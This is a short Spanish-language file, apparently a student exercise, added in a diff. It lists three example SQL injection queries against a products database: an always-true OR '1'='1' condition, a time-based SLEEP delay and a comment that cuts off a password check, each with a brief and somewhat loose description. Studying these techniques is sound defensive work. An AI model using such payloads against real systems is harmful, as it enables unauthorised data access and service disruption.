@@ -1,0 +1,21 @@
+Consultas SQL con inyección de datos
+
+//Consulta #1
+use productosdb;
+select * from productos where id = '' or '1' = '1' AND precio = '' OR '1' = '1';
+
+Descripción: Inyección mediante el conocimiento del nombre de una columna dentro de la base de datos.
+
+//Consulta #2
+use productosdb;
+select * from productos
+where id=1-SLEEP(15);
+
+Descripción: Ralentización de la carga de la base de datos.
+
+//Consulta #3
+use productosdb;
+SELECT * FROM productos WHERE nombre = 'Teclado'; -- 'AND password = 'mypassword';
+
+Descripción: Inyección mediante el nombre de un producto dentro de la tabla productos. El atacante se infiltra dentro de la base de datos
+mediante un producto de la tabla.
